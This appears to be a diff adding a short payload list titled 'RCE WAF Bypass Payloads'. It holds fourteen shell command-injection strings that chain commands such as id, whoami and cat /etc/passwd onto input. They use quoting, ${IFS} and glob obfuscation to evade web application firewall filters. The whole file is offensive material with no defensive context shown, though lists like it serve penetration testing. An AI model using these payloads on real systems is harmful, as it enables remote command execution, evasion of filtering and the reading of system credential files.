@@ -1,0 +1,14 @@
+# RCE WAF Bypass Payloads
+;i\d
+;i''d
+;i""d
+|i`d`
+;$\{IFS\}id
+;${IFS}id
+;id${IFS}
+|i$()d
+;who$()ami
+;w''h''o''a''m''i
+;/???/??t /???/p??swd
+;cat</etc/passwd
+|cat${IFS}/etc/passwd
